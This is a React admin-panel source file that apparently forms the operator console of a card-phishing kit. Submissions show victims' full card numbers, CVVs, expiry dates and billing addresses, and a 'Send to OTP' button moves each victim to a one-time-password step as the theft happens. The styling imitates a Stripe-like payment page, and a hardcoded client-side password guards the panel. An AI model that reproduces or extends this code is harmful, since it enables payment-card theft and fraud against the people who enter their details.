import { useState, useEffect } from "react";
import { supabase } from "@/integrations/supabase/client";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { ArrowRight, Clock, CheckCircle2, CreditCard, Trash2, RefreshCw, Lock } from "lucide-react";

interface Session {
  id: string;
  status: string;
  form_data: any;
  created_at: string;
}

const ADMIN_PASSWORD = "password123";

const Admin = () => {
  const [sessions, setSessions] = useState<Session[]>([]);
  const [authenticated, setAuthenticated] = useState(false);
  const [password, setPassword] = useState("");
  const [error, setError] = useState(false);

  const fetchSessions = async () => {
    const { data } = await supabase
      .from("sessions")
      .select("*")
      .order("created_at", { ascending: false })
      .limit(50);
    if (data) setSessions(data as any);
  };

  useEffect(() => {
    if (!authenticated) return;
    fetchSessions();

    const channel = supabase
      .channel("admin-sessions")
      .on(
        "postgres_changes",
        { event: "*", schema: "public", table: "sessions" },
        () => fetchSessions()
      )
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, [authenticated]);

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    if (password === ADMIN_PASSWORD) {
      setAuthenticated(true);
      setError(false);
    } else {
      setError(true);
    }
  };

  if (!authenticated) {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center p-4">
        <div className="w-full max-w-sm space-y-6">
          <div className="text-center space-y-2">
            <div className="h-12 w-12 rounded-xl bg-muted flex items-center justify-center mx-auto">
              <Lock className="h-6 w-6 text-muted-foreground" />
            </div>
            <h1 className="text-lg font-semibold text-foreground">Admin Access</h1>
            <p className="text-sm text-muted-foreground">Enter password to continue</p>
          </div>
          <form onSubmit={handleLogin} className="space-y-3">
            <Input
              type="password"
              placeholder="Password"
              value={password}
              onChange={(e) => { setPassword(e.target.value); setError(false); }}
              className={error ? "border-destructive" : ""}
              autoFocus
            />
            {error && <p className="text-xs text-destructive">Incorrect password</p>}
            <Button type="submit" className="w-full">Unlock</Button>
          </form>
        </div>
      </div>
    );
  }



  const updateStatus = async (id: string, status: string) => {
    await supabase.from("sessions").update({ status: status as any }).eq("id", id);
  };

  const deleteSession = async (id: string) => {
    await supabase.from("sessions").delete().eq("id", id);
    fetchSessions();
  };

  const statusBadge = (status: string) => {
    const styles: Record<string, string> = {
      pending: "bg-amber-50 text-amber-700 border-amber-200",
      otp: "bg-blue-50 text-blue-700 border-blue-200",
      success: "bg-emerald-50 text-emerald-700 border-emerald-200",
    };
    return (
      <span className={`text-[11px] font-medium px-2 py-0.5 rounded-full border ${styles[status] || "bg-muted text-muted-foreground border-border"}`}>
        {status.toUpperCase()}
      </span>
    );
  };

  const statusIcon = (status: string) => {
    switch (status) {
      case "pending": return <Clock className="h-4 w-4 text-amber-500" />;
      case "otp": return <ArrowRight className="h-4 w-4 text-blue-500" />;
      case "success": return <CheckCircle2 className="h-4 w-4 text-emerald-500" />;
      default: return null;
    }
  };

  return (
    <div className="min-h-screen bg-background">
      <div className="border-b border-border bg-card">
        <div className="max-w-4xl mx-auto px-6 py-4 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="h-8 w-8 rounded-lg bg-stripe-bg flex items-center justify-center">
              <span className="text-white text-sm font-bold">P</span>
            </div>
            <div>
              <h1 className="text-sm font-semibold text-foreground">Admin Panel</h1>
              <p className="text-xs text-muted-foreground">Control payment flow</p>
            </div>
          </div>
          <Button
            variant="outline"
            size="sm"
            onClick={fetchSessions}
            className="h-8 text-xs gap-1.5"
          >
            <RefreshCw className="h-3 w-3" />
            Refresh
          </Button>
        </div>
      </div>

      <div className="max-w-4xl mx-auto px-6 py-6 space-y-3">
        {sessions.length === 0 ? (
          <div className="rounded-lg border border-dashed border-border p-16 text-center">
            <CreditCard className="h-8 w-8 text-muted-foreground/40 mx-auto mb-3" />
            <p className="text-sm text-muted-foreground">No sessions yet</p>
            <p className="text-xs text-muted-foreground/60 mt-1">Waiting for payment submissions...</p>
          </div>
        ) : (
          <div className="rounded-lg border border-border overflow-hidden bg-card">
            <table className="w-full">
              <thead>
                <tr className="border-b border-border bg-muted/30">
                  <th className="text-left text-xs font-medium text-muted-foreground px-4 py-3">Customer</th>
                  <th className="text-left text-xs font-medium text-muted-foreground px-4 py-3">Card Details</th>
                  <th className="text-left text-xs font-medium text-muted-foreground px-4 py-3">Billing Address</th>
                  <th className="text-left text-xs font-medium text-muted-foreground px-4 py-3">Status</th>
                  <th className="text-left text-xs font-medium text-muted-foreground px-4 py-3">Date</th>
                  <th className="text-right text-xs font-medium text-muted-foreground px-4 py-3">Actions</th>
                </tr>
              </thead>
              <tbody>
                {sessions.map((session, i) => {
                  const d = session.form_data || {};
                  return (
                  <tr
                    key={session.id}
                    className={`border-b border-border last:border-0 hover:bg-muted/20 transition-colors ${
                      i === 0 ? "animate-stripe-slide" : ""
                    }`}
                  >
                    <td className="px-4 py-3">
                      <div className="space-y-0.5">
                        <p className="text-sm font-medium text-foreground">
                          {d.cardholderName || "Unknown"}
                        </p>
                        <p className="text-xs text-muted-foreground">
                          {d.email || "—"}
                        </p>
                      </div>
                    </td>
                    <td className="px-4 py-3">
                      <div className="space-y-0.5">
                        <p className="text-xs text-foreground font-mono">{d.cardNumber || "—"}</p>
                        <p className="text-xs text-muted-foreground">
                          Exp: {d.expiry || "—"} &middot; CVV: {d.cvv || "—"}
                        </p>
                      </div>
                    </td>
                    <td className="px-4 py-3">
                      <div className="space-y-0.5 max-w-[200px]">
                        {d.address1 && <p className="text-xs text-foreground">{d.address1}</p>}
                        {d.address2 && <p className="text-xs text-muted-foreground">{d.address2}</p>}
                        <p className="text-xs text-muted-foreground">
                          {[d.city, d.state, d.zip].filter(Boolean).join(", ") || "—"}
                        </p>
                        {d.country && <p className="text-xs text-muted-foreground">{d.country}</p>}
                      </div>
                    </td>
                    <td className="px-4 py-3">
                      <div className="flex items-center gap-2">
                        {statusIcon(session.status)}
                        {statusBadge(session.status)}
                      </div>
                    </td>
                    <td className="px-4 py-3">
                      <p className="text-xs text-muted-foreground">
                        {new Date(session.created_at).toLocaleDateString("en-US", {
                          month: "short",
                          day: "numeric",
                          hour: "2-digit",
                          minute: "2-digit",
                        })}
                      </p>
                    </td>
                    <td className="px-4 py-3">
                      <div className="flex items-center justify-end gap-2">
                        {session.status === "pending" && (
                          <Button
                            size="sm"
                            onClick={() => updateStatus(session.id, "otp")}
                            className="h-7 text-xs px-3 gap-1"
                          >
                            <ArrowRight className="h-3 w-3" />
                            Send to OTP
                          </Button>
                        )}
                        <Button
                          size="sm"
                          variant="ghost"
                          onClick={() => deleteSession(session.id)}
                          className="h-7 w-7 p-0 text-muted-foreground hover:text-destructive"
                        >
                          <Trash2 className="h-3.5 w-3.5" />
                        </Button>
                      </div>
                    </td>
                  </tr>
                  );
                })}
              </tbody>
            </table>
          </div>
        )}
      </div>
    </div>
  );
};

export default Admin;
